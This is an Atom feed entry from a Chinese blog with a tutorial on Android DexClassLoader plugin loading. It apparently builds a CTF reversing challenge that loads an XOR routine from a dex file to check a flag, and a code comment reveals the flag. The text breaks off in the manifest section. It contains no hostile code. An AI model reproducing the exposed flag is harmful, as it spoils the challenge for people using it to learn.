<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ESE&#39;s Note</title>
  
  <subtitle>阅览室</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-08-25T06:06:52.459Z</updated>
  <id>http://yoursite.com/</id>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>dexClassLoader</title>
    <link href="http://yoursite.com/2018/08/18/android_12_dexloader/"/>
    <id>http://yoursite.com/2018/08/18/android_12_dexloader/</id>
    <published>2018-08-18T13:49:18.000Z</published>
    <updated>2018-08-25T06:06:52.459Z</updated>
    
    <content type="html"><![CDATA[<p>android加载器(一般作为插件开发)<br><a id="more"></a></p><h1 id="什么是类加载器？"><a href="#什么是类加载器？" class="headerlink" title="什么是类加载器？"></a>什么是类加载器？</h1><p>类加载器（class loader）是 Java™中的一个很重要的概念。类加载器负责加载 Java 类的字节代码到 Java 虚拟机中。<br>Java 虚拟机使用 Java 类的方式如下：Java 源程序（.java 文件）在经过 Java 编译器编译之后就被转换成 Java 字节代码（.class 文件）。类加载器负责读取 Java 字节代码，并转换成java.lang.Class类的一个实例。每个这样的实例用来表示一个 Java 类。通过此实例的 newInstance()方法就可以创建出该类的一个对象。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">对于Java程序来说，编写程序就是编写类，运行程序也就是运行类（编译得到的<span class="class"><span class="keyword">class</span>文件），其中起到关键作用的就是类加载器<span class="title">ClassLoader</span>。</span></div></pre></td></tr></table></figure></p><p>Dalvik虚拟机类加载机制<br>Dalvik的虚拟机不能用ClassCload直接加载.dex，Android从ClassLoader派生出了两个类：DexClassLoader和PathClassLoader；而这两个类就是我们加载dex文件的关键，这两者的区别是：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span>DexClassLoader：可以加载jar/apk/dex，可以从SD卡中加载未安装的apk；</div><div class="line"><span class="number">2.</span>PathClassLoader：要传入系统中apk的存放Path，所以只能加载已经安装的apk文件。</div></pre></td></tr></table></figure></p><p>这里(参考)[<a href="https://segmentfault.com/a/1190000004062880]讲得很详细" target="_blank" rel="external">https://segmentfault.com/a/1190000004062880]讲得很详细</a></p><h1 id="生成外部dex文件"><a href="#生成外部dex文件" class="headerlink" title="生成外部dex文件"></a>生成外部dex文件</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// DexClassLoader.java</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DexClassLoader</span> <span class="keyword">extends</span> <span class="title">BaseDexClassLoader</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DexClassLoader</span><span class="params">(String dexPath, String optimizedDirectory,</span></span></div><div class="line"><span class="function"><span class="params">            String libraryPath, ClassLoader parent)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>(dexPath, <span class="keyword">new</span> File(optimizedDirectory), libraryPath, parent);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// PathClassLoader.java</span></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PathClassLoader</span> <span class="keyword">extends</span> <span class="title">BaseDexClassLoader</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PathClassLoader</span><span class="params">(String dexPath, ClassLoader parent)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>(dexPath, <span class="keyword">null</span>, <span class="keyword">null</span>, parent);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PathClassLoader</span><span class="params">(String dexPath, String libraryPath,</span></span></div><div class="line"><span class="function"><span class="params">            ClassLoader parent)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>(dexPath, <span class="keyword">null</span>, libraryPath, parent);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这两者只是简单的对BaseDexClassLoader做了一下封装</p><p>平时进行动态加载开发的时候，使用DexClassLoader就够了。但我们也可以创建自己的类去继承ClassLoader，需要注意的是loadClass方法并不是final类型的，所以我们可以重载loadClass方法并改写类的加载逻辑。</p><p>动态加载进来的class如何使用，一般有2种办法</p><p>一种是使用反射调用，这种我不多做介绍。<br>一种是使用接口编程的方式来调用对应的方法，毕竟.dex文件也是我们自己维护的，所以可以把方法抽象成公共接口，把这些接口也复制到主项目里面去，就可以通过这些接口调用动态加载得到的实例的方法了。</p><p>源码包下面新建一个包名称是dynamic，然后在dynamic下新建一个interface接口Dynamic，里面有个接口方法，就叫DynamicXor(String st)吧，返回一个String，到时候我们可以通过Toast弹出来，Dynamic.java：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.ctf.test.mydemo.dynamic;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Dynamic</span> </span>&#123;</div><div class="line">    <span class="function">String <span class="title">DynamicXor</span><span class="params">(String st)</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>接着在dynamic目录下新建一个imp包，创建Impdynamic.java,并实现Dynamic接口：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.ctf.test.mydemo.dynamic.imp;</div><div class="line"></div><div class="line"><span class="keyword">import</span> com.ctf.test.mydemo.dynamic.Dynamic;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Impdynamic</span> <span class="keyword">implements</span> <span class="title">Dynamic</span></span>&#123;</div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">DynamicXor</span><span class="params">(String st)</span> </span>&#123;</div><div class="line">        <span class="keyword">byte</span>[] sbyte = st.getBytes();</div><div class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;st.length();i++)</div><div class="line">        &#123;</div><div class="line">            sbyte[i]= (<span class="keyword">byte</span>) (sbyte[i]^(i+st.length()));</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(sbyte);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>点击Build -&gt; make project，这时候会在build\intermediates\classes\debug目录下生成对应的classes文件。<br>好了我们要把DynamicImpl这个class转换成Dalvik可识别的dex文件，分两步：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">1.</span>先导出DynamicImpl这个类为jar包的形式；</div><div class="line"><span class="number">2.</span>通过android sdk自带的dx.jar工具转换jar包为dex文件。</div></pre></td></tr></table></figure></p><h2 id="打包jar"><a href="#打包jar" class="headerlink" title="打包jar"></a>打包jar</h2><p>打开app目录下的build.gradle文件最后，加上以下代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//删除dynamic.jar包任务</span></div><div class="line"><span class="function">task <span class="title">clearJar</span><span class="params">(type: Delete)</span> </span>&#123;</div><div class="line">    delete <span class="string">'libs/dynamic.jar'</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//打包任务</span></div><div class="line"><span class="function">task <span class="title">makeJar</span><span class="params">(type:org.gradle.api.tasks.bundling.Jar)</span> </span>&#123;</div><div class="line">    <span class="comment">//指定生成的jar名</span></div><div class="line">    baseName <span class="string">'dynamic'</span></div><div class="line">    <span class="comment">//从哪里打包class文件   上面生成的目录  com.ctf.test.mydemo.dynamic.imp</span></div><div class="line">    from(<span class="string">'build/intermediates/classes/debug/com/ctf/test/mydemo/dynamic/'</span>)</div><div class="line">    <span class="comment">//打包到jar后的目录结构</span></div><div class="line">    into(<span class="string">'com/ctf/test/mydemo/dynamic/'</span>)</div><div class="line">    <span class="comment">//去掉不需要打包的目录和文件</span></div><div class="line">    exclude(<span class="string">'test/'</span>, <span class="string">'Dynamic.class'</span>, <span class="string">'BuildConfig.class'</span>, <span class="string">'R.class'</span>)</div><div class="line">    <span class="comment">//去掉R$开头的文件</span></div><div class="line">    exclude&#123; it.name.startsWith(<span class="string">'R$'</span>);&#125;</div><div class="line">&#125;</div><div class="line">makeJar.dependsOn(clearJar, build)</div></pre></td></tr></table></figure></p><p>打开AS的 terminal窗口:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">terminal:&gt;&gt;cd app</div><div class="line">terminal:&gt;&gt;gradle makeJar  <span class="comment">//可能需要配置环境变量gradle，看一下.gradle版本是多少，我是4.4的</span></div></pre></td></tr></table></figure></p><p>执行成功，出现Build Successfully，会在生成app/build/libs/dynamic.jar</p><h2 id="jar转成dex"><a href="#jar转成dex" class="headerlink" title="jar转成dex"></a>jar转成dex</h2><p>使用sdk提供dx.jar将导出的dynamic.jar转换成Dalvik可识别的dex格式,sdk已经将dx.jar放到build-tools\27.0.3\lib目录下,将dynamic.jar复制到dx.jar目录下，AS终端运行<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">terminal:&gt;&gt;cd F:\a_job\tools\adt-bundle-windows\sdk\build-tools\<span class="number">27.0</span><span class="number">.3</span>\lib</div><div class="line">terminal:&gt;&gt;f:</div><div class="line">terminal:&gt;&gt;dx --dex --output=dynamic_dex.jar dynamic.jar</div></pre></td></tr></table></figure></p><p>在dx.jar目录下会生成一个dynamic_dex.jar文件（Davilk虚拟机可执行的dex文件，因为这条命令同时会打包dex文件，因此后缀是jar），接下来就是要在demo中使用这个dex文件。</p><h1 id="主程序"><a href="#主程序" class="headerlink" title="主程序"></a>主程序</h1><p>新建一个项目，在app/src/main/新建一个assets目录，把刚刚生成的dynamic_dex.jar文件放到assets目录下</p><h2 id="FileUtils-java"><a href="#FileUtils-java" class="headerlink" title="FileUtils.java"></a>FileUtils.java</h2><p>新建一个FileUtils.java，FileUtils类是从assets目录下copy文件到app/data/cache目录<br>FileUtils<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.ctf.test.dynamic2;</div><div class="line"></div><div class="line"><span class="keyword">import</span> android.content.Context;</div><div class="line"><span class="keyword">import</span> android.os.Environment;</div><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"><span class="keyword">import</span> java.io.FileOutputStream;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.OutputStream;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileUtils</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copyFiles</span><span class="params">(Context context, String fileName, File desFile)</span> </span>&#123;</div><div class="line">        InputStream in = <span class="keyword">null</span>;</div><div class="line">        OutputStream out = <span class="keyword">null</span>;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            in = context.getApplicationContext().getAssets().open(fileName);</div><div class="line">            out = <span class="keyword">new</span> FileOutputStream(desFile.getAbsolutePath());</div><div class="line">            <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</div><div class="line">            <span class="keyword">int</span> i;</div><div class="line">            <span class="keyword">while</span> ((i = in.read(bytes)) != -<span class="number">1</span>)</div><div class="line">                out.write(bytes, <span class="number">0</span> , i);</div><div class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;<span class="keyword">finally</span> &#123;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                <span class="keyword">if</span> (in != <span class="keyword">null</span>)</div><div class="line">                    in.close();</div><div class="line">                <span class="keyword">if</span> (out != <span class="keyword">null</span>)</div><div class="line">                    out.close();</div><div class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">                e.printStackTrace();</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">hasExternalStorage</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">return</span> Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * 获取缓存路径</span></div><div class="line"><span class="comment">     *</span></div><div class="line"><span class="comment">     * <span class="doctag">@param</span> context</span></div><div class="line"><span class="comment">     * <span class="doctag">@return</span> 返回缓存文件路径</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> File <span class="title">getCacheDir</span><span class="params">(Context context)</span> </span>&#123;</div><div class="line">        File cache;</div><div class="line">        <span class="keyword">if</span> (hasExternalStorage()) &#123;</div><div class="line">            cache = context.getExternalCacheDir();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            cache = context.getCacheDir();</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (!cache.exists())</div><div class="line">            cache.mkdirs();</div><div class="line">        <span class="keyword">return</span> cache;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="main-java"><a href="#main-java" class="headerlink" title="main.java"></a>main.java</h2><p>main函数<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> com.ctf.test.classandroid;</div><div class="line"></div><div class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</div><div class="line"><span class="keyword">import</span> android.os.Bundle;</div><div class="line"><span class="keyword">import</span> android.view.View;</div><div class="line"><span class="keyword">import</span> android.widget.Button;</div><div class="line"><span class="keyword">import</span> android.widget.EditText;</div><div class="line"><span class="keyword">import</span> android.widget.Toast;</div><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.lang.reflect.Method;</div><div class="line"><span class="keyword">import</span> dalvik.system.DexClassLoader;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="meta">@Override</span></div><div class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</div><div class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</div><div class="line">        setContentView(R.layout.activity_main);</div><div class="line">        <span class="keyword">final</span> EditText sstr = (EditText) findViewById(R.id.input_flag);</div><div class="line">        <span class="keyword">final</span> Button ok = (Button) findViewById(R.id.input_ok);</div><div class="line">        ok.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</div><div class="line">                <span class="comment">//flag=This_1s_dexClassLoader</span></div><div class="line">                String st = sstr.getText().toString().trim();</div><div class="line">                <span class="keyword">if</span>(encrypt.check1(loadDexClass(st)))</div><div class="line">                &#123;</div><div class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, getResources().getString(R.string.success), Toast.LENGTH_SHORT).show();</div><div class="line">                &#125;<span class="keyword">else</span></div><div class="line">                &#123;</div><div class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, getResources().getString(R.string.fail), Toast.LENGTH_SHORT).show();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">/**</span></div><div class="line"><span class="comment">     * 加载dex文件中的class，并调用其中的方法</span></div><div class="line"><span class="comment">     */</span></div><div class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">loadDexClass</span><span class="params">(String st)</span> </span>&#123;</div><div class="line">        File cacheFile = FileUtils.getCacheDir(getApplicationContext());</div><div class="line">        String internalPath = cacheFile.getAbsolutePath() + File.separator + getResources().getString(R.string.dexname);</div><div class="line">        File desFile = <span class="keyword">new</span> File(internalPath);</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            <span class="keyword">if</span> (!desFile.exists()) &#123;</div><div class="line">                desFile.createNewFile();</div><div class="line">                FileUtils.copyFiles(<span class="keyword">this</span>, getResources().getString(R.string.dexname), desFile);</div><div class="line">            &#125;</div><div class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        Context context=getApplicationContext();<span class="comment">//获取Context对象；</span></div><div class="line">        File dexOutputDir = context.getDir(<span class="string">"dex"</span>, <span class="number">0</span>);</div><div class="line">        String dexOutputPath = dexOutputDir.getAbsolutePath();</div><div class="line"></div><div class="line">        <span class="comment">//下面开始加载dex class    4.1以上不能读取</span></div><div class="line">        DexClassLoader dexClassLoader = <span class="keyword">new</span> DexClassLoader(internalPath, dexOutputPath, <span class="keyword">null</span>, getClassLoader());</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            String s = getResources().getString(R.string.PluginClass);</div><div class="line">            Class clazz = dexClassLoader.loadClass(s);</div><div class="line">            Object obj = clazz.newInstance() ;</div><div class="line"></div><div class="line">            Method action = clazz.getMethod(getResources().getString(R.string.function), <span class="keyword">new</span> Class[]&#123;String.class&#125;) ;</div><div class="line">            String res = (String)action.invoke(obj, st);</div><div class="line"></div><div class="line">            <span class="keyword">return</span> res;</div><div class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</div><div class="line">            e.printStackTrace();<span class="comment">//抛出ClassNotFoundException的异常</span></div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>activity_main.xml配置如下:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">activity_main.xml</div><div class="line">&#123;</div><div class="line">    .....</div><div class="line">    <span class="tag">&lt;<span class="name">EditText</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/input_flag"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">"80dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginRight</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginTop</span>=<span class="string">"100dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:ems</span>=<span class="string">"10"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:inputType</span>=<span class="string">"textPersonName"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:hint</span>=<span class="string">"input your flag"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toTopOf</span>=<span class="string">"@+id/button"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintTop_toTopOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">tools:ignore</span>=<span class="string">"UnknownId"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">Button</span></span></div><div class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/input_ok"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"102dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"45dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginBottom</span>=<span class="string">"276dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginEnd</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginLeft</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginRight</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:layout_marginStart</span>=<span class="string">"8dp"</span></span></div><div class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"确认"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintBottom_toBottomOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintEnd_toEndOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintHorizontal_bias</span>=<span class="string">"0.458"</span></span></div><div class="line"><span class="tag">        <span class="attr">app:layout_constraintStart_toStartOf</span>=<span class="string">"parent"</span></span></div><div class="line"><span class="tag">        <span class="attr">tools:ignore</span>=<span class="string">"MissingConstraints"</span> /&gt;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>strings配置如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;resources&gt;</div><div class="line">    &lt;<span class="built_in">string</span> name=<span class="string">"app_name"</span>&gt;dynamic2&lt;/<span class="built_in">string</span>&gt;</div><div class="line">    &lt;<span class="built_in">string</span> name=<span class="string">"dexname"</span>&gt;dynamic_dex.jar&lt;/<span class="built_in">string</span>&gt;</div><div class="line">    &lt;<span class="built_in">string</span> name=<span class="string">"success"</span>&gt;Success&lt;/<span class="built_in">string</span>&gt;</div><div class="line">    &lt;<span class="built_in">string</span> name=<span class="string">"fail"</span>&gt;Fail&lt;/<span class="built_in">string</span>&gt;</div><div class="line">    &lt;<span class="built_in">string</span> name=<span class="string">"PluginClass"</span>&gt;com.ctf.test.mydemo.dynamic.imp.ImpDynamic&lt;/<span class="built_in">string</span>&gt;</div><div class="line">    &lt;<span class="built_in">string</span> name=<span class="string">"function"</span>&gt;DynamicXor&lt;/<span class="built_in">string</span>&gt;</div><div class="line">&lt;/resources&gt;</div></pre></td></tr></table></figure></p><p>check1.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">check1</span><span class="params">(String st)</span> </span>&#123;</div><div class="line">    <span class="keyword">byte</span>[] enc = &#123;<span class="number">67</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">110</span>, <span class="number">65</span>, <span class="number">91</span>, <span class="number">69</span>, <span class="number">89</span>, <span class="number">97</span>, <span class="number">79</span>, <span class="number">69</span>, <span class="number">86</span>, <span class="number">85</span>, <span class="number">107</span>, <span class="number">71</span>, <span class="number">72</span>, <span class="number">78</span>, <span class="number">78</span>, <span class="number">94</span>, <span class="number">109</span>&#125;;</div><div class="line">    <span class="keyword">byte</span>[] srtbyte = st.getBytes();</div><div class="line">    <span class="keyword">if</span>(st.length()!=enc.length)</div><div class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;enc.length;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span>(enc[i]!=srtbyte[i])</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="申请权限"><a href="#申请权限" class="headerlink" title="申请权限"></a>申请权限</h2><p>AndroidManifest中申请权限,<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;uses-permission android:name=<span 